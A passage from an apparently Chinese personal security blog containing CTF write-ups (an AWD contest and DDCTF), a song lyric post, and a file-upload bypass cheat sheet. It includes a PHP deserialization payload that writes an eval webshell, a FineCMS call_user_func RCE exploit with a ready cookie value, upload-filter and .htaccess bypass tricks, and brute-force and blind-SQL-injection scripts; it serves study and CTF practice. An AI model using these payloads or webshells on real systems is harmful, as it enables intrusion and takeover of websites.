<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Template</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $cacheFile = <span class="string">'./shell.php'</span>;</span><br><span class="line">    <span class="keyword">public</span> $template = <span class="string">'&lt;?php eval($_REQUEST[test]);'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$t=<span class="keyword">array</span>(<span class="number">1</span>=&gt;<span class="keyword">new</span> Template());</span><br><span class="line">print_r(serialize($t));</span><br></pre></td></tr></table></figure>
<p>最后得到的符合条件的payload为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:1:&#123;i:1;O:+8:&quot;Template&quot;:2:&#123;s:9:&quot;cacheFile&quot;;s:11:&quot;./shell.php&quot;;s:8:&quot;template&quot;;s:28:&quot;&lt;?php eval($_REQUEST[test]);&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>求他的洞就大概都是一些主办方预留的shell之类的了…..</p>
<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>web2是一个finecms,当时防护做得比较好所以没有出现太多的问题.</p>
<h3 id="命令执行1-finecms-dayrui-config-config-class-php"><a href="#命令执行1-finecms-dayrui-config-config-class-php" class="headerlink" title="命令执行1 /finecms/dayrui/config/config.class.php"></a>命令执行1 /finecms/dayrui/config/config.class.php</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$config = unserialize(base64_decode($config));</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'param'</span>]))&#123;</span><br><span class="line">    $config-&gt;$_GET[<span class="string">'param'</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FinecmsConfig</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $config;</span><br><span class="line">    <span class="keyword">private</span> $path;</span><br><span class="line">    <span class="keyword">public</span> $filter;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($config=<span class="string">""</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;config = $config;</span><br><span class="line">        <span class="keyword">echo</span> <span class="number">123</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getConfig</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;config == <span class="string">""</span>)&#123;</span><br><span class="line">            $config = <span class="keyword">isset</span>($_POST[<span class="string">'Finecmsconfig'</span>])?$_POST[<span class="string">'Finecmsconfig'</span>]:<span class="string">""</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">SetFilter</span><span class="params">($value)</span></span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;filter)&#123;</span><br><span class="line">            <span class="keyword">foreach</span>(<span class="keyword">$this</span>-&gt;filter <span class="keyword">as</span> $filter)&#123;</span><br><span class="line"></span><br><span class="line">                </span><br><span class="line">                $array = is_array($value)?array_map($filter,$value):call_user_func($filter,$value);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filter = <span class="keyword">array</span>();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;SetFilter($key);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">""</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里可以看到调用<code>$config-&gt;$_GET[param]</code>,如果<strong>$config</strong>是一个类且这个类不存在<strong>$_GET[param]</strong>这样一个属性就会调用__get()方法.</p>
<p>可以看到这里的FinecmsConfig类正好存在一个<code>__get()</code>方法.而在<code>__get()</code>方法中调用了SetFilter方法.<br>在SetFilter方法中调用了call_user_func方法,因此这里存在命令执行漏洞.</p>
<p>全局搜索引用了config.class.php文件的文件,可以找到在<br>./finecms/Init.php中存在引用,./finecms/Init.php中设置了<strong>$config</strong>变量:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'FINECMS_CONFIG'</span>]))&#123;</span><br><span class="line">    $config = $_COOKIE[<span class="string">'FINECMS_CONFIG'</span>];</span><br><span class="line">    <span class="keyword">require</span> FCPATH.<span class="string">'dayrui/config/config.class.php'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到这里$config的值被设置为<code>$_COOKIE[&#39;FINECMS_CONFIG&#39;]</code>;</p>
<p>因此我们可以得出最后的payload:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FinecmsConfig</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $config;</span><br><span class="line">    <span class="keyword">private</span> $path;</span><br><span class="line">    <span class="keyword">public</span> $filter=<span class="keyword">array</span>(<span class="string">'readfile'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$c = <span class="keyword">new</span> FinecmsConfig();</span><br><span class="line">print_r(base64_encode(serialize($c)));</span><br></pre></td></tr></table></figure>
<p>得到cookie FINECMS_CONFIG的值:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TzoxMzoiRmluZWNtc0NvbmZpZyI6Mzp7czoyMToiAEZpbmVjbXNDb25maWcAY29uZmlnIjtOO3M6MTk6IgBGaW5lY21zQ29uZmlnAHBhdGgiO047czo2OiJmaWx0ZXIiO2E6MTp7aTowO3M6ODoicmVhZGZpbGUiO319</span><br></pre></td></tr></table></figure></p>
<p>GET参数设置为/flag即可获取flag.</p>
<h3 id="命令执行2-1"><a href="#命令执行2-1" class="headerlink" title="命令执行2"></a>命令执行2</h3><p>finecms的一个1day<br><a href="https://zhuanlan.zhihu.com/p/35133267">https://zhuanlan.zhihu.com/p/35133267</a><br><a href="http://lu4n.com/finecms-rce-0day/">http://lu4n.com/finecms-rce-0day/</a></p>
<h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><p>梅子酒师傅之前挖到的一个sql注入的CVE:</p>
<p><a href="https://xz.aliyun.com/t/2050">Finecms SQL注入漏洞 [CVE-2018-6893]</a></p>
<h3 id="其他-1"><a href="#其他-1" class="headerlink" title="其他"></a>其他</h3><p>其他就是类似web1一样的小马之类的了…..</p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>开始打awd之后这次比赛又回到了第一次打awd的感觉….只能说还是太菜了…..<br>以后还是要多联系一下代码审计,真的佩服大佬们代码审计的能力.</p>
<p>另外题目中的漏洞点将会单独抽出来作为代码审计题目放到<a href="http://sus.njnet6.edu.cn/">我校的CTF平台上</a>供师傅们分析练习.</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="http://skysec.top/2018/05/27/2018RedHat-AD-Web/">http://skysec.top/2018/05/27/2018RedHat-AD-Web/</a></li>
<li><a href="https://xz.aliyun.com/t/2050">Finecms SQL注入漏洞 [CVE-2018-6893]</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/35133267">https://zhuanlan.zhihu.com/p/35133267</a>  </li>
<li><a href="http://lu4n.com/finecms-rce-0day/">http://lu4n.com/finecms-rce-0day/</a></li>
</ul>

          
        
      
    </div>

    

    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/wmj-2/index.html">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Imagemlt">
      <meta itemprop="description" content="personal blog">
      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Image's blog">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/post/wmj-2/index.html" itemprop="url">
                  纸短情长
                </a>
              
            
          </h2>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2018-05-21 23:55:35" itemprop="dateCreated datePublished" datetime="2018-05-21T23:55:35+08:00">2018-05-21</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Edited on</span>
                
                <time title="Modified: 2019-07-06 23:27:08" itemprop="dateModified" datetime="2019-07-06T23:27:08+08:00">2019-07-06</time>
              
            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/人生杂谈/" itemprop="url" rel="index"><span itemprop="name">人生杂谈</span></a></span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>你陪我步入蝉夏<br>越过城市喧嚣<br>歌声还在游走<br>你榴花般的双眸<br>不见你的温柔<br>丢失花间欢笑<br>岁月无法停留<br>流云的等候<br>我真的好想你<br>在每一个雨季<br>你选择遗忘的<br>是我最不舍的<br>纸短情长啊<br>道不尽太多涟漪<br>我的故事都是关于你呀<br>怎么会爱上了她<br>并决定跟她回家<br>放弃了我的所有我的一切无所谓<br>纸短情长啊<br>诉不完当时年少<br>我的故事还是关于你呀<br>你陪我步入蝉夏<br>越过城市喧嚣<br>歌声还在游走<br>你榴花般的双眸<br>不见你的温柔<br>丢失花间欢笑<br>岁月无法停留<br>流云的等候<br>我真的好想你<br>在每一个雨季<br>你选择遗忘的<br>是我最不舍的<br>纸短情长啊<br>道不尽太多涟漪<br>我的故事都是关于你呀<br>怎么会爱上了她<br>并决定跟她回家<br>放弃了我的所有我的一切无所谓<br>纸短情长啊<br>诉不完当时年少<br>我的故事还是关于你呀<br>我真的好想你<br>在每一个雨季<br>你选择遗忘的<br>是我最不舍的<br>纸短情长啊<br>道不尽太多涟漪<br>我的故事都是关于你呀<br>怎么会爱上了她<br>并决定跟她回家<br>放弃了我的所有我的一切无所谓<br>纸短情长啊<br>诉不完当时年少<br>我的故事还是关于你呀<br>我的故事还是关于你呀</p>

          
        
      
    </div>

    

    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/file-upload-attacks/index.html">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Imagemlt">
      <meta itemprop="description" content="personal blog">
      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Image's blog">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/post/file-upload-attacks/index.html" itemprop="url">
                  文件上传漏洞的总结
                </a>
              
            
          </h2>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2018-04-24 00:37:10" itemprop="dateCreated datePublished" datetime="2018-04-24T00:37:10+08:00">2018-04-24</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Edited on</span>
                
                <time title="Modified: 2019-07-06 23:27:08" itemprop="dateModified" datetime="2019-07-06T23:27:08+08:00">2019-07-06</time>
              
            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/人生杂谈/" itemprop="url" rel="index"><span itemprop="name">人生杂谈</span></a></span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="防御文件上传的一些思路"><a href="#防御文件上传的一些思路" class="headerlink" title="防御文件上传的一些思路"></a>防御文件上传的一些思路</h2><ul>
<li>客户端javascript校验（通常校验扩展名）</li>
<li>检查文件扩展名</li>
<li>检查MIME类型</li>
<li>随机文件名</li>
<li>隐藏路径</li>
<li>重写内容（影响效率）imagecreatefromjpeg…</li>
<li>检查内容是否合法</li>
</ul>
<h2 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧"></a>绕过技巧</h2><ul>
<li>$_FILES[‘file’][‘type’]:burp抓包可修改</li>
<li>内容检查：<ul>
<li><code>&lt;script language=“php”&gt;&lt;/script&gt;</code></li>
</ul>
</li>
<li>文件名拓展检查：黑名单绕过 ○ Php3 php5 phtml PPHP pHp phtm inc ○ Jsp jspx jspf ○ Asp asa cer aspx ○ Exe exee ○ 后缀名加空格 ○ 00截断 ○ 双重后缀名绕过</li>
<li>常配合文件包含漏洞达到特殊效果</li>
<li>通过比较gd函数处理前后的文件找到不产生变化的区块写入特殊的payload<a href="http://www.freebuf.com/articles/web/54086.html">http://www.freebuf.com/articles/web/54086.html</a></li>
<li>phpinfo+lfi</li>
<li>htaccess攻击<ul>
<li>AddType application/x-httpd-php .jpg</li>
</ul>
</li>
</ul>
<pre><code>&lt;FilesMatch &quot;95zz.gif&quot;&gt;
SetHandler application/x-httpd-php
&lt;/FilesMatch&gt;
</code></pre><ul>
<li>opcache文件getshell(利用phpinfo获得缓存目录后上传shell)<a href="https://www.exehack.net/3272.html">https://www.exehack.net/3272.html</a><ul>
<li>如果内存缓存的优先级高于文件缓存，那么重写opcache文件并不会执行我们的webshell</li>
<li>开启了validate_timestamp的绕过:<ul>
<li>Wordpress某些文件时间戳一样</li>
</ul>
</li>
<li><a href="https://github.com/GoSecure/php7-opcache-override">opcache-override</a></li>
</ul>
</li>
<li>文件头检测方法：将木马后缀到文件末(常见的是通过getimagesize()函数)</li>
<li>file_put_contents 数组绕过</li>
<li>当代码中存在spl_autoload_register()函数时可以上传.inc文件(laravel、composer中常用)(湖湘杯)<ul>
<li>spl_autoload_register()函数使用后将会自动调用inc文件</li>
</ul>
</li>
<li><p>move_uploaded_file() 名称可控时可上传至任意位置，aaaa/../index.php/.绕过后缀名检测</p>
</li>
<li><p>上传模板文件</p>
</li>
<li>上传绕过 parse_url函数可以通过多个斜杠来绕过</li>
</ul>

          
        
      
    </div>

    

    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/ddctf-writeup/index.html">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Imagemlt">
      <meta itemprop="description" content="personal blog">
      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Image's blog">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/post/ddctf-writeup/index.html" itemprop="url">
                  DDCTF writeup
                </a>
              
            
          </h2>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2018-04-22 22:55:12" itemprop="dateCreated datePublished" datetime="2018-04-22T22:55:12+08:00">2018-04-22</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Edited on</span>
                
                <time title="Modified: 2019-07-06 23:27:08" itemprop="dateModified" datetime="2019-07-06T23:27:08+08:00">2019-07-06</time>
              
            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/人生杂谈/" itemprop="url" rel="index"><span itemprop="name">人生杂谈</span></a></span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><p>公告</p>
<h2 id="╯°□°）╯︵-┻━┻"><a href="#╯°□°）╯︵-┻━┻" class="headerlink" title="(╯°□°）╯︵ ┻━┻"></a>(╯°□°）╯︵ ┻━┻</h2><p>将字符串base64解码后再凯撒移位即可获得flag.</p>
<h2 id="第四扩展fs"><a href="#第四扩展fs" class="headerlink" title="第四扩展fs"></a>第四扩展fs</h2><p>binwalk 可从图片中获得一个压缩包，图片右击属性里面详细信息-备注可获得压缩包密码为Pactera,解压压缩包后获得一个文本文件,复制内容进行字频统计即可获得flag<a href="http://www.aihanyu.org/cncorpus/CpsTongji.aspx">在线字词频率统计</a> <img src="http://p7lc13qga.bkt.clouddn.com/misc2.PNG" alt="misc2"></p>
<h2 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h2><p>协议分级，看到有ftp协议、stmp协议，stmp协议中有一个base64后的图片，提取该图片并解码可以发现一串字符串，经题目提示可知为一个私钥文件，用ocr软件提取后并修改错误补全格式，wireshark中导入即可看到最后的部分解密出一个http封包，内容中可以获得flag。 <img src="http://p7lc13qga.bkt.clouddn.com/out.jpg" alt="私钥图片"> <img src="http://p7lc13qga.bkt.clouddn.com/captrue.PNG" alt="capt"></p>
<h2 id="安全通信"><a href="#安全通信" class="headerlink" title="安全通信"></a>安全通信</h2><p>利用aes_ecb分组加密的特点，而且generate_hello中的message长度可控，所以可以按位爆破flag. poc:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">mission_key=<span class="string">"2acba569d223cf7d6e48dee88378288a"</span></span><br><span class="line"></span><br><span class="line">begin=<span class="number">24</span></span><br><span class="line"></span><br><span class="line">ans=<span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    f=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    f.connect((<span class="string">"116.85.48.103"</span>,<span class="number">5002</span>))</span><br><span class="line">    <span class="keyword">print</span> f.recv(<span class="number">1024</span>)</span><br><span class="line">    f.send(mission_key+<span class="string">"\n"</span>)</span><br><span class="line">    <span class="keyword">print</span> f.recv(<span class="number">1024</span>)</span><br><span class="line">    f.send(<span class="string">'a'</span>*begin+<span class="string">"\n"</span>)</span><br><span class="line">    crypt=f.recv(<span class="number">1024</span>)</span><br><span class="line">    data=f.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="keyword">print</span> crypt,data,begin,((len(ans)/<span class="number">16</span>)+<span class="number">1</span>)*<span class="number">32</span></span><br><span class="line">    querystring=<span class="string">'&#123;&#125;0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'</span></span><br><span class="line">    i=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i&lt;len(querystring):</span><br><span class="line">        f.send(querystring[i]+ans+<span class="string">"\n"</span>)</span><br><span class="line">        info=f.recv(<span class="number">1024</span>).split()</span><br><span class="line">        <span class="comment">#print querystring[i]</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data=info[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment">#print info,data,-(((len(ans)/32)+1)*32+1),crypt[-((len(ans)/32)+1)*32-1:-1]</span></span><br><span class="line">        <span class="keyword">if</span>(crypt[-((len(ans)/<span class="number">16</span>)+<span class="number">1</span>)*<span class="number">32</span><span class="number">-1</span>:<span class="number">-1</span>]==data):</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"mark"</span></span><br><span class="line">            ans=querystring[i]+ans</span><br><span class="line">            <span class="keyword">print</span> ans</span><br><span class="line">            begin=begin+<span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        data=f.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="comment">#print "[+]"+data</span></span><br><span class="line">        i=i+<span class="number">1</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"================data is &#123;&#125; end a loop"</span>.format(ans)</span><br></pre></td></tr></table></figure>
<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="数据库的秘密"><a href="#数据库的秘密" class="headerlink" title="数据库的秘密"></a>数据库的秘密</h2><p>盲注，里面的js加密算法懒得看所以直接用nodejs编写盲注脚本，导入网页中引入的math.js用于加密,脚本如下:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">var</span> http=<span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line">    <span class="keyword">var</span> querystring=<span class="built_in">require</span>(<span class="string">'querystring'</span>);</span><br><span class="line">    <span class="keyword">var</span> math=<span class="built_in">require</span>(<span class="string">'./math'</span>);</span><br><span class="line">    <span class="keyword">var</span> cheerio=<span class="built_in">require</span>(<span class="string">"cheerio"</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> key=<span class="string">"adrefkfweodfsdpiru"</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">signGenerate</span>(<span class="params">obj, key</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> str0 = <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i <span class="keyword">in</span> obj) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i != <span class="string">'sign'</span>) &#123;</span><br><span class="line">                str1 = <span class="string">''</span>;</span><br><span class="line">                str1 = i + <span class="string">'='</span> + obj[i];</span><br><span class="line">                str0 += str1</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> math(str0 + key)</span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> request=<span class="function"><span class="keyword">function</span>(<span class="params">options,postData</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve</span>)=&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">var</span> data=<span class="string">""</span>;</span><br><span class="line">            <span class="keyword">var</span> req = http.request(options, <span class="function"><span class="keyword">function</span> (<span class="params">res</span>) </span>&#123;</span><br><span class="line">                res.on(<span class="string">"data"</span>, <span class="function"><span class="keyword">function</span> (<span class="params">chunk</span>) </span>&#123;</span><br><span class="line">                    data+=chunk.toString();</span><br><span class="line">                &#125;);</span><br><span class="line">                res.on(<span class="string">"end"</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">                    <span class="comment">//console.log("data emitted successfully");</span></span><br><span class="line">                    resolve(data);</span><br><span class="line">                &#125;);</span><br><span class="line">                <span class="comment">//console.log(res.statusCode);</span></span><br><span class="line">            &#125;);</span><br><span class="line">            req.on(<span 